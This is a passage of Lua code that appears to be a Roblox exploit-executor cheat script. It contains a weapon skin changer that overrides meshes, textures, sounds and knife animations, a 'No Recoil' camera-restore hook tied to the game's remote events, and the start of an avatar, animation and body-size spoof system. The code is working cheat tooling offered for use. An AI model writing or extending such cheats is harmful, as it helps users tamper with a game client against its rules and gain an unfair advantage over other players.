				default.Transparency = 1;
			end;
		else
			if skinData.DesiredTransparency ~= nil and default.Transparency ~= skinData.DesiredTransparency then
				default.Transparency = skinData.DesiredTransparency;
			end;
			if skinData.DesiredTextureID ~= nil and default.TextureID ~= skinData.DesiredTextureID then
				default.TextureID = skinData.DesiredTextureID;
			end;
		end;
	end;

	RemoveSkinFromTool = function(Tool)
		if not Tool or not AppliedSkins[Tool] then return end;
		CleanKnife(Tool);
		local original = AppliedSkins[Tool];
		if original.Connections then
			for _, connection in next, original.Connections do
				if connection and connection.Connected then
					connection:Disconnect();
				end;
			end;
		end;
		for _, child in next, original.ClonedChildren or {} do
			if child and child.Parent then
				child:Destroy();
			end;
		end;
		if original.Default and original.Default.Parent then
			for _, child in next, original.Default:GetChildren() do
				if child.Name == '\0' then
					child:Destroy();
				end;
			end;
			original.Default.Transparency = original.OriginalTransparency or 0;
			original.Default.TextureID = original.OriginalTextureID or '';
		end;
		if original.ShootSoundOriginals then
			for sound, soundId in next, original.ShootSoundOriginals do
				if sound and sound.Parent and soundId then
					sound.SoundId = soundId;
				end;
			end;
		elseif original.ShootSound and original.OriginalShootSoundId then
			original.ShootSound.SoundId = original.OriginalShootSoundId;
		end;
		local Handle = Tool:FindFirstChild('Handle');
		if Handle then
			Handle:SetAttribute('SkinName', original.OriginalSkinName or '');
		end;
		AppliedSkins[Tool] = nil;
	end;

	local function ScheduleInitialGunRefresh(Tool, SkinName)
		if not Tool or InitialGunSkinRefreshDone[Tool] then return end;
		InitialGunSkinRefreshDone[Tool] = true;
		task.delay(0.35, function()
			local skinData = AppliedSkins[Tool];
			if not skinData or skinData.SkinName ~= SkinName then
				return;
			end;
			RemoveSkinFromTool(Tool);
			ApplySkinToTool(Tool, SkinName);
		end);
	end;

	ApplySkinToTool = function(Tool, SkinName)
		if not Tool then return end;
		if AppliedSkins[Tool] and AppliedSkins[Tool].SkinName == SkinName then return end;
		local Handle = Tool:FindFirstChild('Handle');
		if not Handle then return end;
		local default = Tool:FindFirstChild('Default');
		if not default or not default:IsA('MeshPart') then
			default = Handle:FindFirstChildOfClass('MeshPart');
			if not default then
				for _, child in next, Tool:GetDescendants() do
					if child:IsA('MeshPart') then
						default = child;
						break;
					end;
				end;
			end;
		end;
		if not default then return end;
		local ShootSound = FindShootSoundInstance(Tool);
		if AppliedSkins[Tool] then
			RemoveSkinFromTool(Tool);
		end;
		AppliedSkins[Tool] = {
			SkinName = SkinName,
			OriginalTextureID = default.TextureID,
			OriginalTransparency = default.Transparency,
			OriginalSkinName = Handle:GetAttribute('SkinName') or '',
			Default = default,
			ShootSound = ShootSound,
			OriginalShootSoundId = ShootSound and ShootSound.SoundId or nil,
			ShootSoundOriginals = ShootSound and { [ShootSound] = ShootSound.SoundId } or {},
			ClonedChildren = {},
			Connections = {},
			DesiredTextureID = default.TextureID,
			DesiredTransparency = default.Transparency,
			HideDefault = false,
		};
		Handle:SetAttribute('SkinName', SkinName);
		local attrConn = Handle:GetAttributeChangedSignal('SkinName'):Connect(function()
			if Handle:GetAttribute('SkinName') ~= SkinName then
				Handle:SetAttribute('SkinName', SkinName);
			end;
		end);
		table.insert(AppliedSkins[Tool].Connections, attrConn);
		local isKnife = Tool.Name:lower():find('knife') ~= nil or Tool.Name == '[Knife]';
		local weaponName = Tool.Name:lower():sub(2, -2);
		local skinInfo = GetSkinInfo(Tool.Name, SkinName);
		local textureOnlySkin = not isKnife and skinInfo and type(skinInfo.TextureID) == 'string' and skinInfo.TextureID ~= '';
		if not isKnife and not skinInfo then
			PendingSkinReprocess[Tool] = SkinName;
			task.defer(LoadSkinData);
			GetShootSoundForSkin(Tool);
			return;
		end;
		if not isKnife then
			for _, child in next, Tool:GetChildren() do
				if child:IsA('MeshPart') and child ~= default and child ~= Handle then
					child:Destroy();
				end;
			end;
			for _, child in next, default:GetChildren() do
				if child:IsA('MeshPart') then
					child:Destroy();
				end;
			end;
			default.Transparency = AppliedSkins[Tool].OriginalTransparency or 0;
			default.TextureID = AppliedSkins[Tool].OriginalTextureID or '';
		end;
		local mesh = nil;
		if not isKnife and skinInfo and skinInfo.TextureID and not textureOnlySkin then
			local tv = skinInfo.TextureID;
			if typeof(tv) == 'Instance' then
				if tv:IsA('MeshPart') then
					mesh = tv;
				elseif tv:IsA('Model') or tv:IsA('Folder') then
					mesh = tv:GetChildren();
				end;
			end;
		end;
		if not isKnife and not mesh and not textureOnlySkin and SkinModules and typeof(SkinModules) == 'Instance' then
			local MeshesFolder = SkinModules:FindFirstChild('Meshes');
			if MeshesFolder then
				local skinFolder = MeshesFolder:FindFirstChild(SkinName)
					or MeshesFolder:FindFirstChild(SkinName:gsub(' ', ''))
					or MeshesFolder:FindFirstChild(SkinName:gsub(' ', '_'))
					or MeshesFolder:FindFirstChild(SkinName:gsub('-', ' '))
					or MeshesFolder:FindFirstChild(SkinName:gsub('-', ''));
				if skinFolder then
					if skinFolder:IsA('MeshPart') then
						mesh = skinFolder;
					else
						mesh = skinFolder:GetChildren();
					end;
				end;
			end;
			if not mesh then
				local GunModels = SkinModules:FindFirstChild('GunModels');
				if GunModels then
					local model = GunModels:FindFirstChild(SkinName)
						or GunModels:FindFirstChild('[' .. SkinName .. ']')
						or GunModels:FindFirstChild(SkinName:gsub('-', ' '))
						or GunModels:FindFirstChild(SkinName:gsub('-', ''));
					if model then
						if model:IsA('MeshPart') then
							mesh = model;
						elseif model:IsA('Model') then
							mesh = model:FindFirstChildOfClass('MeshPart');
						end;
					end;
				end;
			end;
		end;
		local skinMesh = nil;
		if mesh and not isKnife then
			if typeof(mesh) == 'Instance' and mesh:IsA('MeshPart') then
				skinMesh = mesh;
			elseif type(mesh) == 'table' then
				for _, child in next, mesh do
					if typeof(child) == 'Instance' and child:IsA('MeshPart') then
						local lowered = child.Name:lower();
						if lowered:find('rpg') and weaponName == 'rpg' then
							skinMesh = child; break;
						elseif lowered:find('aug') and weaponName == 'aug' then
							skinMesh = child; break;
						elseif lowered:find('tac') and weaponName == 'tacticalshotgun' then
							skinMesh = child; break;
						elseif lowered:find('rev') and weaponName == 'revolver' then
							skinMesh = child; break;
						elseif (lowered:find('db') or lowered:find('double')) and (weaponName == 'double-barrel sg' or weaponName == 'double-barrelsg') then
							skinMesh = child; break;
						elseif lowered:find('rifle') and weaponName == 'rifle' then
							skinMesh = child; break;
						elseif lowered:find('flame') and weaponName == 'flamethrower' then
							skinMesh = child; break;
						end;
					end;
				end;
				if not skinMesh then
					for _, child in next, mesh do
						if typeof(child) == 'Instance' and child:IsA('MeshPart') then
							skinMesh = child;
							break;
						end;
					end;
				end;
			end;
		end;
		local hidDefault = false;
		if skinMesh and not isKnife then
			local newFake = skinMesh:Clone();
			newFake.Anchored = false;
			newFake.CanCollide = false;
			newFake.CFrame = default.CFrame;
			local skinCFrame = (skinInfo and skinInfo.CFrame and typeof(skinInfo.CFrame) == 'CFrame') and skinInfo.CFrame or CFrame.new();
			local weld = Instance.new('Weld');
			weld.Part0 = newFake;
			weld.Part1 = default;
			weld.C0 = skinCFrame:Inverse();
			weld.Name = '\0';
			weld.Parent = newFake;
			newFake.Name = '\0';
			newFake.Parent = Tool;
			default.Transparency = 1;
			hidDefault = true;
			if AppliedSkins[Tool] then
				AppliedSkins[Tool].HideDefault = true;
				AppliedSkins[Tool].DesiredTransparency = 1;
				AppliedSkins[Tool].DesiredTextureID = AppliedSkins[Tool].OriginalTextureID or '';
				table.insert(AppliedSkins[Tool].ClonedChildren, newFake);
			end;
		elseif not isKnife and skinInfo then
			local textureValue = skinInfo.TextureID;
			if textureValue then
				if typeof(textureValue) == 'Instance' and textureValue:IsA('MeshPart') then
					local clone = textureValue:Clone();
					clone.Anchored = false;
					clone.CanCollide = false;
					clone.CFrame = default.CFrame;
					clone.Name = '\0';
					clone.Parent = Tool;
					local skinCFrame = (skinInfo.CFrame and typeof(skinInfo.CFrame) == 'CFrame') and skinInfo.CFrame or CFrame.new();
					local weld = Instance.new('Weld');
					weld.Part0 = clone;
					weld.Part1 = default;
					weld.C0 = skinCFrame:Inverse();
					weld.Name = '\0';
					weld.Parent = clone;
					default.Transparency = 1;
					hidDefault = true;
					if AppliedSkins[Tool] then
						AppliedSkins[Tool].HideDefault = true;
						AppliedSkins[Tool].DesiredTransparency = 1;
						AppliedSkins[Tool].DesiredTextureID = AppliedSkins[Tool].OriginalTextureID or '';
						table.insert(AppliedSkins[Tool].ClonedChildren, clone);
					end;
				elseif type(textureValue) == 'string' then
					default.TextureID = textureValue;
					default.Transparency = 0;
					if AppliedSkins[Tool] then
						AppliedSkins[Tool].HideDefault = false;
						AppliedSkins[Tool].DesiredTransparency = 0;
						AppliedSkins[Tool].DesiredTextureID = textureValue;
					end;
				end;
			end;
		end;
		if not isKnife and AppliedSkins[Tool] then
			local function StripIntruders()
				if not AppliedSkins[Tool] then return end;
				ReapplyGunSkinState(Tool);
			end;
			local function IsOurs(nm)
				return #nm == 0 or nm == '\0';
			end;
			local addConn = Tool.ChildAdded:Connect(function(c)
				if c:IsA('MeshPart') and not IsOurs(c.Name) and c ~= default and c ~= Handle then
					task.defer(StripIntruders);
				end;
			end);
			table.insert(AppliedSkins[Tool].Connections, addConn);
			local defAddConn = default.ChildAdded:Connect(function(c)
				if c:IsA('MeshPart') and not IsOurs(c.Name) then
					task.defer(StripIntruders);
				end;
			end);
			table.insert(AppliedSkins[Tool].Connections, defAddConn);
			if hidDefault then
				local transConn = default:GetPropertyChangedSignal('Transparency'):Connect(function()
					if AppliedSkins[Tool] and default.Transparency ~= 1 then
						default.Transparency = 1;
					end;
				end);
				table.insert(AppliedSkins[Tool].Connections, transConn);
			else
				local transConn = default:GetPropertyChangedSignal('Transparency'):Connect(function()
					local skinData = AppliedSkins[Tool];
					if skinData and skinData.DesiredTransparency ~= nil and default.Transparency ~= skinData.DesiredTransparency then
						default.Transparency = skinData.DesiredTransparency;
					end;
				end);
				table.insert(AppliedSkins[Tool].Connections, transConn);
			end;
			local textureConn = default:GetPropertyChangedSignal('TextureID'):Connect(function()
				if AppliedSkins[Tool] and default.TextureID ~= AppliedSkins[Tool].DesiredTextureID then
					default.TextureID = AppliedSkins[Tool].DesiredTextureID or '';
				end;
			end);
			table.insert(AppliedSkins[Tool].Connections, textureConn);
			task.defer(StripIntruders);
			task.delay(0.1, function()
				if AppliedSkins[Tool] then
					ReapplyGunSkinState(Tool);
				end;
			end);
			task.delay(0.35, function()
				if AppliedSkins[Tool] then
					ReapplyGunSkinState(Tool);
				end;
			end);
		end;
		for _, child in next, Handle:GetChildren() do
			if #child.Name == 0 then
				child:Destroy();
			end;
		end;
		if SkinAssets then
			local GunHandleParticle = SkinAssets:FindFirstChild('GunHandleParticle');
			if GunHandleParticle then
				local particleFolder = GunHandleParticle:FindFirstChild(SkinName)
					or GunHandleParticle:FindFirstChild(SkinName:gsub('-', ' '))
					or GunHandleParticle:FindFirstChild(SkinName:gsub('-', ''));
				if particleFolder then
					local emitter = particleFolder:FindFirstChildOfClass('ParticleEmitter');
					if emitter then
						local clonedParticle = emitter:Clone();
						clonedParticle.Parent = Handle;
						clonedParticle.Name = '\0';
						table.insert(AppliedSkins[Tool].ClonedChildren, clonedParticle);
					end;
				end;
			end;
		end;
		if isKnife and SkinAssets then
			local SkinScripts = SkinAssets:FindFirstChild('SkinScripts');
			if SkinScripts then
				for _, folder in next, SkinScripts:GetChildren() do
					if folder.Name:lower():gsub(' ', '') == SkinName:lower():gsub(' ', '') then
						local sound = folder:FindFirstChildOfClass('Sound');
						if sound then
							local cloned = sound:Clone();
							cloned.Name = '\0';
							cloned.Parent = Handle;
							cloned:Play();
							game.Debris:AddItem(cloned, 3);
						end;
						for _, obj in next, folder:GetDescendants() do
							if obj:IsA('Sound') or obj:IsA('StringValue') then
								local objLower = obj.Name:lower():gsub(' ', '');
								if objLower == 'equipsfx' or objLower == 'sfx' or objLower == 'equip' or objLower == 'tantoequip' then
									AppliedSkins[Tool].KnifeEquipSound = obj:IsA('Sound') and obj.SoundId or obj.Value;
								elseif objLower == 'attacksfx' or objLower == 'attack' then
									AppliedSkins[Tool].KnifeAttackSound = obj:IsA('Sound') and obj.SoundId or obj.Value;
								end;
							end;
						end;
						break;
					end;
				end;
			end;
			local SkinScriptsStorage = SkinAssets:FindFirstChild('SkinScriptsStorage');
			if SkinScriptsStorage then
				for _, folder in next, SkinScriptsStorage:GetChildren() do
					if folder.Name:lower():gsub(' ', '') == SkinName:lower():gsub(' ', '') then
						for _, anim in next, folder:GetDescendants() do
							if anim:IsA('Animation') then
								local animLower = anim.Name:lower():gsub(' ', '');
								if animLower == 'knife' or animLower == 'equipknife' or animLower == 'knifeequip' or animLower == 'tantoequip' then
									AppliedSkins[Tool].KnifeEquipAnim = anim;
									break;
								end;
							end;
						end;
						break;
					end;
				end;
			end;
			local KnifeSkinAnimation = SkinAssets:FindFirstChild('KnifeSkinAnimation');
			if KnifeSkinAnimation then
				for _, folder in next, KnifeSkinAnimation:GetChildren() do
					if folder.Name:lower():gsub(' ', '') == SkinName:lower():gsub(' ', '') then
						for _, anim in next, folder:GetDescendants() do
							if anim:IsA('Animation') then
								AppliedSkins[Tool].KnifeAttackAnim = anim;
								break;
							end;
						end;
						break;
					end;
				end;
			end;
		end;
		if isKnife and SkinName:lower():gsub(' ', '') == 'goldenagetanto' then
			if not AppliedSkins[Tool].KnifeEquipAnim then
				local anim = Instance.new('Animation');
				anim.AnimationId = 'rbxassetid://13473404819';
				AppliedSkins[Tool].KnifeEquipAnim = anim;
			else
				AppliedSkins[Tool].KnifeEquipAnim.AnimationId = 'rbxassetid://13473404819';
			end;
		end;
		if isKnife and (SkinName:lower():gsub(' ', '') == 'gpoknife' or SkinName:lower():gsub(' ', '') == 'gpoknifeprestige') then
			if not AppliedSkins[Tool].KnifeEquipAnim then
				local anim = Instance.new('Animation');
				anim.AnimationId = 'rbxassetid://102007904524177';
				AppliedSkins[Tool].KnifeEquipAnim = anim;
			else
				AppliedSkins[Tool].KnifeEquipAnim.AnimationId = 'rbxassetid://102007904524177';
			end;
		end;
		GetShootSoundForSkin(Tool);
		local soundConn = Tool.DescendantAdded:Connect(function(desc)
			if desc:IsA('Sound') and (desc.Name == 'Shoot' or desc.Name == 'ShootSound') then
				task.defer(function()
					if AppliedSkins[Tool] and AppliedSkins[Tool].SkinName == SkinName then
						GetShootSoundForSkin(Tool);
					end;
				end);
			end;
		end);
		table.insert(AppliedSkins[Tool].Connections, soundConn);
		if not isKnife then
			ScheduleInitialGunRefresh(Tool, SkinName);
		end;
	end;

	function ProcessTool(Tool)
		if ToolRegistry[Tool] then return end;
		ToolRegistry[Tool] = true;
		local SkinChangerCfg = GetSkinChangerCfg();
		if not SkinChangerCfg['Enabled'] then return end;
		local Skins = SkinChangerCfg['Skins'];
		local ConfiguredSkin = Skins[Tool.Name];
		if not ConfiguredSkin then
			local stripped = Tool.Name:gsub('%[', ''):gsub('%]', '');
			ConfiguredSkin = Skins['[' .. stripped .. ']'];
		end;
		if not ConfiguredSkin or ConfiguredSkin == '' or ConfiguredSkin == 'None' then return end;
		local isKnife = Tool.Name:lower():find('knife') ~= nil or Tool.Name == '[Knife]';
		if isKnife and IsKnifeSkin(ConfiguredSkin) then
			ApplySkinToTool(Tool, ConfiguredSkin);
			local equipConn;
			equipConn = Tool.Equipped:Connect(function()
				if not AppliedSkins[Tool] then
					if equipConn then equipConn:Disconnect() end;
					return;
				end;
				local char = Tool.Parent;
				if char ~= LocalPlayer.Character then return end;
				ApplyKnife(char, Tool, ConfiguredSkin);
			end);
			if not AppliedSkins[Tool].Connections then
				AppliedSkins[Tool].Connections = {};
			end;
			table.insert(AppliedSkins[Tool].Connections, equipConn);
			if LocalPlayer.Character and Tool.Parent == LocalPlayer.Character then
				ApplyKnife(LocalPlayer.Character, Tool, ConfiguredSkin);
			end;
			if AppliedSkins[Tool] and (AppliedSkins[Tool].KnifeAttackAnim or AppliedSkins[Tool].KnifeAttackSound) then
				local attackConnection;
				attackConnection = Tool.Activated:Connect(function()
					local skinData = AppliedSkins[Tool];
					if not skinData then
						if attackConnection then attackConnection:Disconnect() end;
						return;
					end;
					if skinData.KnifeAttackSound then
						local sound = Instance.new('Sound');
						sound.SoundId = skinData.KnifeAttackSound;
						sound.Volume = 1;
						sound.Parent = Tool:FindFirstChild('Handle') or Tool;
						sound:Play();
						game.Debris:AddItem(sound, 3);
					end;
					if skinData.KnifeAttackAnim then
						local Character = LocalPlayer.Character;
						if Character then
							local Humanoid = Character:FindFirstChildOfClass('Humanoid');
							if Humanoid then
								local Animator = Humanoid:FindFirstChildOfClass('Animator');
								if not Animator then
									Animator = Instance.new('Animator');
									Animator.Parent = Humanoid;
								end;
								local anim = Instance.new('Animation');
								anim.AnimationId = skinData.KnifeAttackAnim.AnimationId;
								local track = Animator:LoadAnimation(anim);
								track.Priority = Enum.AnimationPriority.Action;
								track:Play();
								anim:Destroy();
							end;
						end;
					end;
				end);
				table.insert(AppliedSkins[Tool].Connections, attackConnection);
			end;
		else
			ApplySkinToTool(Tool, ConfiguredSkin);
			Tool.Equipped:Connect(function()
				local char = Tool.Parent;
				if char ~= LocalPlayer.Character then return end;
				ApplySkinToTool(Tool, ConfiguredSkin);
			end);
			if LocalPlayer.Character and Tool.Parent == LocalPlayer.Character then
				ApplySkinToTool(Tool, ConfiguredSkin);
			end;
		end;
	end;

	function ProcessCharacter(Character)
		if not Character then return end;
		for _, Child in next, Character:GetChildren() do
			if Child:IsA('Tool') then
				ProcessTool(Child);
			end;
		end;
		Character.ChildAdded:Connect(function(Child)
			if Child:IsA('Tool') then
				Wait(0.1);
				ProcessTool(Child);
			end;
		end);
	end;

	function ProcessBackpack(Backpack)
		if not Backpack then return end;
		for _, Tool in next, Backpack:GetChildren() do
			if Tool:IsA('Tool') then
				ProcessTool(Tool);
			end;
		end;
		Backpack.ChildAdded:Connect(function(Tool)
			if Tool:IsA('Tool') then
				Wait(0.1);
				ProcessTool(Tool);
			end;
		end);
	end;

	task.spawn(LoadSkinData);
	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait();
	local Backpack = LocalPlayer:FindFirstChild('Backpack') or LocalPlayer:WaitForChild('Backpack', 5);
	ProcessCharacter(Character);
	if Backpack then ProcessBackpack(Backpack) end;
	LocalPlayer.CharacterAdded:Connect(function(NewCharacter)
		Wait(0.5);
		ProcessCharacter(NewCharacter);
		local NewBackpack = LocalPlayer:FindFirstChild('Backpack') or LocalPlayer:WaitForChild('Backpack', 5);
		if NewBackpack then ProcessBackpack(NewBackpack) end;
	end);

	local function GetConfiguredSkinFor(Tool)
		local SkinChangerCfg = GetSkinChangerCfg();
		if not SkinChangerCfg or not SkinChangerCfg['Enabled'] then return nil end;
		local Skins = SkinChangerCfg['Skins'];
		local ConfiguredSkin = Skins[Tool.Name];
		if not ConfiguredSkin then
			local stripped = Tool.Name:gsub('%[', ''):gsub('%]', '');
			ConfiguredSkin = Skins['[' .. stripped .. ']'];
		end;
		if not ConfiguredSkin or ConfiguredSkin == '' or ConfiguredSkin == 'None' then return nil end;
		return ConfiguredSkin;
	end;

	local function ReapplySkinChangerTools()
		local function reapplyContainer(Container)
			if not Container then return end;
			for _, Tool in next, Container:GetChildren() do
				if Tool:IsA('Tool') then




					local NewSkin = GetConfiguredSkinFor(Tool);
					local CurrentSkin = AppliedSkins[Tool] and AppliedSkins[Tool].SkinName or nil;
					if NewSkin ~= CurrentSkin then
						ToolRegistry[Tool] = nil;
						InitialGunSkinRefreshDone[Tool] = nil;
						pcall(function() RemoveSkinFromTool(Tool) end);
						pcall(function() ProcessTool(Tool) end);
					end;
				end;
			end;
		end;
		reapplyContainer(LocalPlayer.Character);
		reapplyContainer(LocalPlayer:FindFirstChild('Backpack'));
	end;

	local PreviousReapplyAllSkins = ReapplyAllSkins;
	ReapplyAllSkins = function()
		if PreviousReapplyAllSkins then PreviousReapplyAllSkins() end;
		ReapplySkinChangerTools();
	end;
end;


do 
	function GetMiscGunCfg() return GetConfig()['Weapon Modifications']['Extra'] end;
	CurrentCamera = Workspace.CurrentCamera;
	SavedCFrame = CurrentCamera.CFrame;
	RestorePending = false;

	function QueueRestore()
		if RestorePending then return end;
		RestorePending = true;
		Defer(function()
			if RestorePending then
				CurrentCamera.CFrame = SavedCFrame;
				RestorePending = false;
			end;
		end);
	end;

	RunService.RenderStepped:Connect(function()
		CurrentCamera = Workspace.CurrentCamera;
		if not RestorePending then
			SavedCFrame = CurrentCamera.CFrame;
		end;
	end);

	local MainRemote = ReplicatedStorage:FindFirstChild('MainEvent');
	if MainRemote and MainRemote:IsA('RemoteEvent') then
		MainRemote.OnClientEvent:Connect(function(Packet)
			if Packet == 'ShootingRecoil' and GetMiscGunCfg()['No Recoil'] then
				QueueRestore();
			end;
		end);
	end;

	local function HookGunShot(Character)
		local BodyEffects = Character:WaitForChild('BodyEffects', 5);
		if not BodyEffects then return end;
		local GunShotChanges = BodyEffects:FindFirstChild('GunShotChanges');
		if not GunShotChanges then return end;
		GunShotChanges.Changed:Connect(function()
			if GetMiscGunCfg()['No Recoil'] then
				QueueRestore();
			end;
		end);
	end;

	if LocalPlayer.Character then Spawn(HookGunShot, LocalPlayer.Character) end;
	LocalPlayer.CharacterAdded:Connect(function(Char) Spawn(HookGunShot, Char) end);
end;

--=================================================================
-- AVATAR / ANIMATION / EMOTE SPOOF SYSTEM
--=================================================================
do
    if getgenv().avatar_cleanup then
        pcall(getgenv().avatar_cleanup)
        getgenv().avatar_cleanup = nil
    end

    local Players           = game:GetService("Players")
    local RunService        = game:GetService("RunService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local CoreGui           = game:GetService("CoreGui")
    local GuiService        = game:GetService("GuiService")
    local InsertService     = game:GetService("InsertService")

    local LocalPlayer = Players.LocalPlayer
    local Camera      = workspace.CurrentCamera

    local okEnv, env = pcall(function() return getgenv() end)
    if not okEnv then env = nil end

    -- Char config lives on shared.gravity (main config table)
    shared.gravity = shared.gravity or {}
    if type(shared.gravity['Char']) ~= 'table' then
        shared.gravity['Char'] = {
            ['Enabled'] = true,
            ['Target'] = 'keptmywords',
            ['Body Size'] = {
                ['Enabled'] = true,
                ['Mode'] = 'Skinny',
            },
            ['Animations'] = {
                ['Enabled'] = true,
                ['Idle'] = 'Zombie',
                ['Run'] = 'Zombie',
                ['Walk'] = 'Zombie',
                ['Jump'] = 'Ninja',
                ['Fall'] = 'Ninja',
                ['Climb'] = 'Ninja',
                ['Swim'] = 'Default',
                ['SwimIdle'] = 'Default',
            },
        }
    end
    -- alias for this subsystem
    shared.gravity = shared.gravity or {}
    shared.gravity['Char'] = shared.gravity['Char']

    local Cfg = shared.gravity['Char']
    local CONFIG = {
        target = Cfg['Target'] or '',
        changer = {
            enabled = Cfg['Enabled'] == true and (Cfg['Body Size'] and Cfg['Body Size']['Enabled'] ~= false),
            width = 1, depth = 1, height = 1, head = 1, proportion = 1, bodyType = 0,
            targetScales = nil,
            enforceIntervalSeconds = 1.5,
        },
        animations = Cfg['Animations'] or {},
    }

    do
        local Size = Cfg['Body Size'] or {}
        local Profiles = {
            Skinny = { width=0.52, depth=0.52, height=1.00, head=1.00, proportion=1.00, bodyType=0.00 },
            Normal = { width=1.00, depth=1.00, height=1.00, head=1.00, proportion=1.00, bodyType=0.00 },
            Fat    = { width=1.50, depth=1.50, height=1.00, head=1.00, proportion=1.00, bodyType=0.00 },
        }
        local p = Profiles[Size['Mode']] or Profiles.Skinny
        CONFIG.changer.width      = p.width
        CONFIG.changer.depth      = p.depth
        CONFIG.changer.height     = p.height
        CONFIG.changer.head       = p.head
        CONFIG.changer.proportion = p.proportion
        CONFIG.changer.bodyType   = p.bodyType
    end

    local ANIM_PRESETS = {
        ['Ninja']      = { Idle='rbxassetid://656118341', Run='rbxassetid://656118852', Walk='rbxassetid://656121766', Jump='rbxassetid://656117878', Fall='rbxassetid://10921159222', Climb='rbxassetid://656114359', Swim='rbxassetid://10921161002', SwimIdle='rbxassetid://10922757002' },
        ['Robot']      = { Idle='rbxassetid://616089559', Run='rbxassetid://616091570', Walk='rbxassetid://616095330', Jump='rbxassetid://616090535', Fall='rbxassetid://616092998', Climb='rbxassetid://616086039', Swim='rbxassetid://10921253142', SwimIdle='rbxassetid://10921253767' },
        ['Default']    = { Idle='rbxassetid://507766666', Run='rbxassetid://10921261968', Walk='rbxassetid://10921269718', Jump='rbxassetid://10921263860', Fall='rbxassetid://10921262864', Climb='rbxassetid://10921257536', Swim='rbxassetid://10921264784', SwimIdle='rbxassetid://10921265698' },
        ['Custom']     = { Idle='rbxassetid://92080889861410', Run='rbxassetid://16738337225', Walk='rbxassetid://16738340646', Jump='rbxassetid://104325245285198', Fall='rbxassetid://616003713', Climb='rbxassetid://18537363391', Swim='rbxassetid://133308483266208', SwimIdle='rbxassetid://109346520324160' },
        ['Levitate']   = { Idle='rbxassetid://616008087', Run='rbxassetid://616010382', Walk='rbxassetid://616013216', Jump='rbxassetid://616008936', Fall='rbxassetid://616005863', Climb='rbxassetid://616003713', Swim='rbxassetid://10921139478', SwimIdle='rbxassetid://10921138209' },
        ['Mage']       = { Idle='rbxassetid://707855907', Run='rbxassetid://707861613', Walk='rbxassetid://707897309', Jump='rbxassetid://707853694', Fall='rbxassetid://707829716', Climb='rbxassetid://707826056', Swim='rbxassetid://10921150788', SwimIdle='rbxassetid://10921151661' },
        ['Stylish']    = { Idle='rbxassetid://616138447', Run='rbxassetid://616140816', Walk='rbxassetid://616146177', Jump='rbxassetid://616139451', Fall='rbxassetid://616134815', Climb='rbxassetid://616133594', Swim='rbxassetid://10921281000', SwimIdle='rbxassetid://10921281964' },
        ['Hero']       = { Idle='rbxassetid://616113536', Run='rbxassetid://616117076', Walk='rbxassetid://616122287', Jump='rbxassetid://616115533', Fall='rbxassetid://616108001', Climb='rbxassetid://616104706', Swim='rbxassetid://10921295495', SwimIdle='rbxassetid://10921297391' },
        ['Toy']        = { Idle='rbxassetid://782845736', Run='rbxassetid://782842708', Walk='rbxassetid://782843345', Jump='rbxassetid://782847020', Fall='rbxassetid://782846423', Climb='rbxassetid://782843869', Swim='rbxassetid://10921309319', SwimIdle='rbxassetid://10921310341' },
        ['Astronaut']  = { Idle='rbxassetid://891633237', Run='rbxassetid://891636393', Walk='rbxassetid://891667138', Jump='rbxassetid://891627522', Fall='rbxassetid://891617961', Climb='rbxassetid://891609353', Swim='rbxassetid://10921044000', SwimIdle='rbxassetid://10921045006' },
        ['Bubbly']     = { Idle='rbxassetid://910009958', Run='rbxassetid://910025107', Walk='rbxassetid://910034870', Jump='rbxassetid://910016857', Fall='rbxassetid://910001910', Climb='rbxassetid://742636889', Swim='rbxassetid://10921063569', SwimIdle='rbxassetid://10922582160' },
        ['Cartoony']   = { Idle='rbxassetid://742638445', Run='rbxassetid://742638842', Walk='rbxassetid://742640026', Jump='rbxassetid://742637942', Fall='rbxassetid://742637151', Climb='rbxassetid://742636889', Swim='rbxassetid://10921079380', SwimIdle='rbxassetid://10921081059' },
        ['Elder']      = { Idle='rbxassetid://845400520', Run='rbxassetid://845386501', Walk='rbxassetid://845403856', Jump='rbxassetid://845398858', Fall='rbxassetid://845396048', Climb='rbxassetid://845392038', Swim='rbxassetid://10921108971', SwimIdle='rbxassetid://10921110146' },
        ['Ghost']      = { Idle='rbxassetid://616008087', Run='rbxassetid://616013216', Walk='rbxassetid://616013216', Jump='rbxassetid://616008936', Fall='rbxassetid://616005863', Climb='rbxassetid://616156119', Swim='rbxassetid://133308483266208', SwimIdle='rbxassetid://109346520324160' },
        ['Knight']     = { Idle='rbxassetid://657568135', Run='rbxassetid://657564596', Walk='rbxassetid://657552124', Jump='rbxassetid://658409194', Fall='rbxassetid://657600338', Climb='rbxassetid://658360781', Swim='rbxassetid://10921125160', SwimIdle='rbxassetid://10921125935' },
        ['Vampire']    = { Idle='rbxassetid://1083450166', Run='rbxassetid://1083462077', Walk='rbxassetid://1083473930', Jump='rbxassetid://1083455352', Fall='rbxassetid://1083443587', Climb='rbxassetid://1083439238', Swim='rbxassetid://10921324408', SwimIdle='rbxassetid://10921325443' },
        ['Werewolf']   = { Idle='rbxassetid://1083214717', Run='rbxassetid://1083216690', Walk='rbxassetid://1083178339', Jump='rbxassetid://1083218792', Fall='rbxassetid://1083189019', Climb='rbxassetid://1083182000', Swim='rbxassetid://10921340419', SwimIdle='rbxassetid://10921341319' },
        ['Zombie']     = { Idle='rbxassetid://616160636', Run='rbxassetid://616163682', Walk='rbxassetid://616168032', Jump='rbxassetid://616161997', Fall='rbxassetid://616157476', Climb='rbxassetid://616156119', Swim='rbxassetid://10921352344', SwimIdle='rbxassetid://10921353442' },
        ['Bold']       = { Idle='rbxassetid://16738334710', Run='rbxassetid://16738337225', Walk='rbxassetid://16738340646', Jump='rbxassetid://16738336650', Fall='rbxassetid://16738333171', Climb='rbxassetid://16738332169', Swim='rbxassetid://16738339158', SwimIdle='rbxassetid://16738339817' },
        ['Adidas']     = { Idle='rbxassetid://18537371272', Run='rbxassetid://18537384940', Walk='rbxassetid://18537392113', Jump='rbxassetid://18537380791', Fall='rbxassetid://18537367238', Climb='rbxassetid://18537363391', Swim='rbxassetid://18537389531', SwimIdle='rbxassetid://18537387180' },
        ['Pirate']     = { Idle='rbxassetid://750782770', Run='rbxassetid://750783738', Walk='rbxassetid://750785693', Jump='rbxassetid://750782230', Fall='rbxassetid://750780242', Climb='rbxassetid://750779899', Swim='rbxassetid://750784579', SwimIdle='rbxassetid://750785176' },
